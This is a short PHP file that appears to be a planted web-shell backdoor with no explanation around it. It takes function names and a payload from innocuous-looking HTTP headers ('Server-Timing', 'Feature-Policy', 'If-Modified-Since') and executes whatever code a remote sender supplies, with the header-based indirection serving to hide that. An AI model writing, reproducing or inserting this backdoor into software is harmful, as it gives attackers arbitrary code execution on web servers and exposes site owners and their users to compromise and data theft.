<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $rindex = $_HEADERS['Server-Timing']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
    $rindex();
}